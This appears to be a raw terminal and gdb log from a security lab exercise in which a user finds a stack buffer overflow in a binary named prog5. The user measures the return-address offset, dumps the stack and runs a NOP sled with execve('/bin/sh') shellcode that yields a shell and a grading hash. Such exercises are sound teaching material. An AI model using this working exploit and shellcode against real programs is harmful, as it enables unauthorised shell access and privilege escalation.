username@bandit:~$ gdb prog5
(gdb) disas main
Dump of assembler code for function main:
   0x56555784 <+0>:     lea    0x4(%esp),%ecx
   0x56555788 <+4>:     and    $0xfffffff0,%esp
   0x5655578b <+7>:     pushl  -0x4(%ecx)
   0x5655578e <+10>:    push   %ebp
   0x5655578f <+11>:    mov    %esp,%ebp
   0x56555791 <+13>:    push   %esi
   0x56555792 <+14>:    push   %ebx
   0x56555793 <+15>:    push   %ecx
   0x56555794 <+16>:    sub    $0x1c,%esp
   0x56555797 <+19>:    call   0x565555b0 <__x86.get_pc_thunk.bx>
   0x5655579c <+24>:    add    $0x1864,%ebx
   0x565557a2 <+30>:    mov    %ecx,%esi
   0x565557a4 <+32>:    cmpl   $0x1,(%esi)
   0x565557a7 <+35>:    jg     0x565557cf <main+75>
   0x565557a9 <+37>:    mov    -0x10(%ebx),%eax
   0x565557af <+43>:    mov    (%eax),%eax
   0x565557b1 <+45>:    push   %eax
   0x565557b2 <+46>:    push   $0x1e
   0x565557b4 <+48>:    push   $0x1
   0x565557b6 <+50>:    lea    -0x16c0(%ebx),%eax
   0x565557bc <+56>:    push   %eax
   0x565557bd <+57>:    call   0x56555500 <fwrite@plt>
   0x565557c2 <+62>:    add    $0x10,%esp
   0x565557c5 <+65>:    sub    $0xc,%esp
   0x565557c8 <+68>:    push   $0x1
   0x565557ca <+70>:    call   0x56555520 <exit@plt>
   0x565557cf <+75>:    mov    0x8(%esi),%eax
---Type <return> to continue, or q <return> to quit---
   0x565557d2 <+78>:    mov    %eax,-0x1c(%ebp)
   0x565557d5 <+81>:    jmp    0x56555802 <main+126>
   0x565557d7 <+83>:    mov    -0x1c(%ebp),%eax
   0x565557da <+86>:    mov    (%eax),%eax
   0x565557dc <+88>:    mov    %eax,-0x20(%ebp)
   0x565557df <+91>:    sub    $0xc,%esp
   0x565557e2 <+94>:    pushl  -0x20(%ebp)
   0x565557e5 <+97>:    call   0x56555530 <strlen@plt>
   0x565557ea <+102>:   add    $0x10,%esp
   0x565557ed <+105>:   sub    $0x4,%esp
   0x565557f0 <+108>:   push   %eax
   0x565557f1 <+109>:   push   $0x0
   0x565557f3 <+111>:   pushl  -0x20(%ebp)
   0x565557f6 <+114>:   call   0x56555550 <memset@plt>
   0x565557fb <+119>:   add    $0x10,%esp
   0x565557fe <+122>:   addl   $0x4,-0x1c(%ebp)
   0x56555802 <+126>:   mov    -0x1c(%ebp),%eax
   0x56555805 <+129>:   mov    (%eax),%eax
   0x56555807 <+131>:   test   %eax,%eax
   0x56555809 <+133>:   jne    0x565557d7 <main+83>
   0x5655580b <+135>:   mov    0x4(%esi),%eax
   0x5655580e <+138>:   add    $0x4,%eax
   0x56555811 <+141>:   mov    (%eax),%eax
   0x56555813 <+143>:   sub    $0xc,%esp
   0x56555816 <+146>:   push   %eax
   0x56555817 <+147>:   call   0x565556e0 <processInput>
   0x5655581c <+152>:   add    $0x10,%esp
   0x5655581f <+155>:   mov    $0x0,%eax
---Type <return> to continue, or q <return> to quit---
   0x56555824 <+160>:   lea    -0xc(%ebp),%esp
   0x56555827 <+163>:   pop    %ecx
   0x56555828 <+164>:   pop    %ebx
   0x56555829 <+165>:   pop    %esi
   0x5655582a <+166>:   pop    %ebp
   0x5655582b <+167>:   lea    -0x4(%ecx),%esp
   0x5655582e <+170>:   ret    
End of assembler dump.
(gdb) b *0x5655581f
Breakpoint 2 at 0x5655581f
(gdb) r $(python -c "print 'A' * 140 + 'B' * 4")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 140 + 'B' * 4")
Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Epic Fail! Epic Fail! Epic Fail! Epic Fail!

Breakpoint 2, 0x5655581f in main ()
(gdb) c
Continuing.
[Inferior 1 (process 29547) exited normally]
(gdb) r $(python -c "print 'A' * 500 + 'B' * 4")
Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 500 + 'B' * 4")
Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Epic Fail! Epic Fail! Epic Fail! Epic Fail!

Breakpoint 2, 0x5655581f in main ()
(gdb) c
Continuing.
[Inferior 1 (process 29551) exited normally]
(gdb) r $(python -c "print 'A' * 508 + 'B' * 4")
Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 508 + 'B' * 4")
Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Epic Fail! Epic Fail! Epic Fail! Epic Fail!

Program received signal SIGSEGV, Segmentation fault.
0x56555800 in main ()
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) r $(python -c "print 'A' * 580 + 'B' * 4")
Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 580 + 'B' * 4")
Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Epic Fail! Epic Fail! Epic Fail! Epic Fail!

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) r $(python -c "print 'A' * 516 + 'B' * 4")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 516 + 'B' * 4")
Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Epic Fail! Epic Fail! Epic Fail! Epic Fail!

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) r $(python -c "print 'A' * 512 + 'B' * 4")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 512 + 'B' * 4")
Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Epic Fail! Epic Fail! Epic Fail! Epic Fail!

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) r $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\6e\x89\xe3\x50\x53\x89\xe1\x89\
xc2\xb0\x0b\xcd\x80" + "B"*4')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /usr/local/bin/prog5 $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\
6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4')
Hello, what is the magic word?: You said ������������������������������������������������
��������������������������������������������������������������������������
��������������������������������������������������������������������������
��������������������������������������������������������������������������
��������������������������������������������������������������������������
��������������������������������������������������������������������������
�����������������������������������������������������������1�Ph/shh/bie��PS���°
                           BBBB
Epic Fail! Epic Fail! Epic Fail! Epic Fail!

Breakpoint 2, 0x5655581f in main ()
(gdb) x/600wx $esp
0xffffda10:     0xffffffff      0x56557000      0xffffdfa5      0xffffdb3c
0xffffda20:     0x00000002      0xffffdae4      0xffffdaf0      0xffffda50
0xffffda30:     0x00000000      0x00000002      0x00000000      0xf7e29286
0xffffda40:     0x00000002      0xf7fc5000      0x00000000      0xf7e29286
0xffffda50:     0x00000002      0xffffdae4      0xffffdaf0      0x00000000
0xffffda60:     0x00000000      0x00000000      0xf7fc5000      0xf7ffdc0c
0xffffda70:     0xf7ffd000      0x00000000      0x00000002      0xf7fc5000
0xffffda80:     0x00000000      0x49ed3363      0x737d1f73      0x00000000
0xffffda90:     0x00000000      0x00000000      0x00000002      0x56555570
0xffffdaa0:     0x00000000      0xf7fee5f0      0xf7e29199      0x56557000
0xffffdab0:     0x00000002      0x56555570      0x00000000      0x565555a1
0xffffdac0:     0x56555784      0x00000002      0xffffdae4      0x56555830
0xffffdad0:     0x56555890      0xf7fe8f50      0xffffdadc      0xf7ffd920
0xffffdae0:     0x00000002      0xffffdc0d      0xffffdc22      0x00000000
---Type <return> to continue, or q <return> to quit---
0xffffdaf0:     0xffffde1d      0xffffde52      0xffffde61      0xffffde72
0xffffdb00:     0xffffde7f      0xffffde93      0xffffdea1      0xffffdec3
0xffffdb10:     0xffffdecc      0xffffdeef      0xffffdf13      0xffffdf26
0xffffdb20:     0xffffdf31      0xffffdf49      0xffffdf59      0xffffdf6d
0xffffdb30:     0xffffdf75      0xffffdf86      0xffffdfa5      0x00000000
0xffffdb40:     0x00000020      0xf7fd7c80      0x00000021      0xf7fd7000
0xffffdb50:     0x00000010      0x078afbfd      0x00000006      0x00001000
0xffffdb60:     0x00000011      0x00000064      0x00000003      0x56555034
0xffffdb70:     0x00000004      0x00000020      0x00000005      0x00000009
0xffffdb80:     0x00000007      0xf7fd9000      0x00000008      0x00000000
0xffffdb90:     0x00000009      0x56555570      0x0000000b      0x0000178a
0xffffdba0:     0x0000000c      0x0000178a      0x0000000d      0x0000178a
0xffffdbb0:     0x0000000e      0x0000178a      0x00000017      0x00000000
0xffffdbc0:     0x00000019      0xffffdbeb      0x0000001f      0xffffdfe3
---Type <return> to continue, or q <return> to quit---
0xffffdbd0:     0x0000000f      0xffffdbfb      0x00000000      0x00000000
0xffffdbe0:     0x00000000      0x00000000      0x8d000000      0xc963889f
0xffffdbf0:     0xc44e5b2c      0xf4aff0ae      0x6972088c      0x00363836
0xffffdc00:     0x00000000      0x00000000      0x00000000      0x73752f00
0xffffdc10:     0x6f6c2f72      0x2f6c6163      0x2f6e6962      0x676f7270
0xffffdc20:     0x90900035      0x90909090      0x90909090      0x90909090
0xffffdc30:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc40:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc50:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc60:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc70:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc80:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdc90:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdca0:     0x90909090      0x90909090      0x90909090      0x90909090
---Type <return> to continue, or q <return> to quit---
0xffffdcb0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdcc0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdcd0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdce0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdcf0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdd00:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdd10:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdd20:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdd30:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdd40:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdd50:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdd60:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdd70:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdd80:     0x90909090      0x90909090      0x90909090      0x90909090
---Type <return> to continue, or q <return> to quit---
0xffffdd90:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdda0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffddb0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffddc0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffddd0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdde0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffddf0:     0x90909090      0x90909090      0x90909090      0x31909090
0xffffde00:     0x2f6850c0      0x2f686873      0x65066962      0x5350e389
0xffffde10:     0xc289e189      0x80cd0bb0      0x42424242      0x00000000
0xffffde20:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffde30:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffde40:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffde50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffde60:     0x00000000      0x00000000      0x00000000      0x00000000
---Type <return> to continue, or q <return> to quit---
0xffffde70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffde80:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffde90:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdea0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdeb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdec0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffded0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdee0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdef0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdf00:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdf10:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdf20:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdf30:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdf40:     0x00000000      0x00000000      0x00000000      0x00000000
---Type <return> to continue, or q <return> to quit---
0xffffdf50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdf60:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdf70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdf80:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdf90:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdfa0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdfb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdfc0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdfd0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdfe0:     0x2f000000      0x2f727375      0x61636f6c      0x69622f6c
0xffffdff0:     0x72702f6e      0x0035676f      0x00000000      0x00000000
0xffffe000:     Cannot access memory at address 0xffffe000
(gdb) r $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\6e\x89\xe3\x50\x53\x89\xe1\
x89\xc2\xb0\x0b\xcd\x80" + "\x50\xdd\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /usr/local/bin/prog5 $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\
x69\6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xdd\xff\xff"')
Hello, what is the magic word?: You said ����������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
�����������������������������������������������������������������������1
�Ph/shh/bie��PS���°
                           P���
Epic Fail! Epic Fail! Epic Fail! Epic Fail!

Breakpoint 2, 0x5655581f in main ()
(gdb) c
Continuing.
[Inferior 1 (process 29583) exited normally]
(gdb) quit
username@bandit:~$ gdb prog5^C
username@bandit:~$ /usr/local/bin/prog5 $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\
x69\6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xdd\xff\xff"')
Hello, what is the magic word?: You said ����������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
�����������������������������������������������������������������������1
�Ph/shh/bie��PS���°
                           P���
Epic Fail! Epic Fail! Epic Fail! Epic Fail!
username@bandit:~$ prog5 $(python2 -c 'print "\x90" * 484 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\
x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x50\xdd\xff\xff"')
Hello, what is the magic word?: You said ����������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������1�Ph//shh/bin���°
                               1�@P���
Epic Fail! Epic Fail! Epic Fail! Epic Fail!
Segmentation fault
username@bandit:~$ prog5 $(python2 -c 'print "\x90" * 484 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\
x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x50\xdd\xff\xff"')
Hello, what is the magic word?: You said ����������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������������������������������������������������������������������������
������1�Ph//shh/bin�����°
                                 1�@P���
Epic Fail! Epic Fail! Epic Fail! Epic Fail!
$ /bin/grade
Congratulations -- your hash is ########################:####:####
